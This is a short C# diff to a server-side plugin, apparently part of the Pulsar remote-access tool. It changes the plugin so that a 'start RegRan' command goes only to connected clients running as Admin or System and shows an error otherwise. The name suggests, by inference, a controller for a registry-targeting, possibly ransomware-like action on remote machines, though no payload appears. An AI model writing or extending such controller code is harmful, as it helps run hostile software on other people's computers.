@@ -1,9 +1,8 @@
-﻿using System;
-using System.Collections.Generic;
-using System.IO;
+﻿using Pulsar.Server.Networking;
 using Pulsar.Server.Plugins;
-using Pulsar.Server.Networking;
-using Pulsar.Server.Messages;
+using System;
+using System.Collections.Generic;
+using System.Windows.Forms;
 
 namespace Pulsar.Plugin.RanReg.Server
 {
@@ -40,7 +39,17 @@ namespace Pulsar.Plugin.RanReg.Server
 
             foreach (var client in clients)
             {
-                SendStartRegRan(client);
+                bool isClientAdmin = client.Value.AccountType == "Admin" || client.Value.AccountType == "System";
+
+                if (isClientAdmin)
+                {
+                    SendStartRegRan(client);
+                }
+                else
+                {
+                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
+
             }
 
             _context.Log($"Sent start command to {clients.Count} client(s)");
